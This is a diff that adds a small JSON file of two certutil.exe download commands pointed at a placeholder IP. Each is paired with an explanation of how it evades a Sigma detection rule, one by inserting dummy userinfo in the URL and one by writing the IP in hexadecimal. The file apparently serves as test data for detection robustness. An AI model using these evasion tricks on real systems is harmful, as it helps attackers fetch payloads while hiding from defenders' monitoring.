@@ -1,0 +1,10 @@
+[
+  {
+    "output": "certutil.exe -urlcache -split -f http://testuser@192.0.2.1/example.txt C:\\\temp\\example.txt",
+    "explanation": "Bypasses the 'selection\\_http' condition by prepending a dummy HTTP Basic Authentication string. The Sigma rule specifically looks for a digit (1-9) immediately following the protocol (e.g., '://1'). By injecting 'testuser@', the evaluated string becomes '://t', successfully evading the hardcoded string matching while still resolving the direct IP."
+  },
+  {
+    "output": "certutil.exe -urlcache -split -f http://0xC0000201/example.txt C:\\\temp\\example.txt",
+    "explanation": "Bypasses the 'selection\\_http' condition by using the hexadecimal representation of the IP address (192.0.2.1 translates to 0xC0000201). The Sigma filter only checks for IP addresses starting with digits 1 through 9. Because the hexadecimal format begins with a '0' (://0), it avoids triggering the rule while the underlying Windows network API still correctly resolves the IP."
+  }
+]
